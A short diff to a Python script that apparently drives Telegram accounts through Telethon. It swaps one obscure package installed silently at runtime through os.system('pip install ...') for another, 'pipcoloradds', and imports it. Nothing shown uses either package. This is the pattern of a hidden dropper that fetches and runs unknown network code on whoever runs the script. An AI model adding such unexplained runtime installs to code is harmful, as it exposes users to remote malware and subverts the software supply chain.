@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingkitV1")
-import pipfontingkitV1
+os.system("pip install pipcoloradds")
+import pipcoloradds
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
